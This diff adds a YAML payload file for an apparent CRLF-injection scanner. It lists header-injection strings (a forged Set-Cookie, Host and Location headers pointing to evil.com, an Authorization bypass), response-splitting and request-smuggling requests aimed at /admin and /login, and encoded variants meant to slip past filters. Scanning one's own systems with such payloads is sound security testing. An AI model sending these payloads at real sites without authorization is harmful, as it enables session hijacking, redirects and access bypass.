@@ -1,0 +1,88 @@
+# CRLF Injection Payloads
+# Usado por crlfinjection.py
+
+category_map:
+  param:
+    - get_crlf
+    - post_crlf
+    - json_crlf
+  header:
+    - ua_crlf
+    - referer_crlf
+    - cookie_crlf
+    - xff_crlf
+  path:
+    - path_crlf
+    - path_split
+  split:
+    - request_split
+    - response_split
+    - double_crlf
+  bypass:
+    - encoded_crlf
+    - double_encode
+    - nullbyte_crlf
+
+crlf_payloads:
+  - - crlf_header
+    - "\r\nX-Injected: test-crlf"
+  - - crlf_cookie
+    - "\r\nSet-Cookie: evil=injected"
+  - - crlf_host
+    - "\r\nHost: evil.com"
+  - - crlf_newline
+    - "\r\n\r\n<h1>INJECTED</h1>"
+  - - crlf_body
+    - "\r\nContent-Length: 0\r\n\r\n"
+  - - crlf_chunked
+    - "\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
+  - - crlf_auth
+    - "\r\nAuthorization: Bypass token=1"
+  - - crlf_location
+    - "\r\nLocation: http://evil.com"
+
+split_payloads:
+  - - split_simple
+    - "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>SPLIT</h1>"
+  - - split_admin
+    - "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
+  - - split_cookie
+    - "POST /login HTTP/1.1\r\nHost: target\r\nCookie: admin=1\r\n\r\n"
+  - - split_double
+    - "GET /ok HTTP/1.1\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
+
+encoded_payloads:
+  - - percent_0d0a
+    - "%0d%0aX-Injected: test"
+  - - percent_0a
+    - "%0aX-Injected: test"
+  - - percent_0d
+    - "%0dX-Injected: test"
+  - - double_encoded
+    - "%250d%250aX-Injected: test"
+  - - unicode_crlf
+    - "\u000d\u000aX-Injected: test"
+  - - backslash_rn
+    - "\\r\\nX-Injected: test"
+
+split_points:
+  - - url_path
+    - "/%0d%0aX-Injected:%20test"
+    - path
+  - - query_param
+    - "?q=%0d%0aX-Injected:%20test"
+    - param
+  - - fragment
+    - "/#%0d%0aX-Injected:%20test"
+    - path
+  - - path_end
+    - "/page%0d%0aX-Injected:%20test"
+    - path
+
+header_names:
+  - User-Agent
+  - Referer
+  - Cookie
+  - X-Forwarded-For
+  - Accept-Language
+  - X-Requested-With
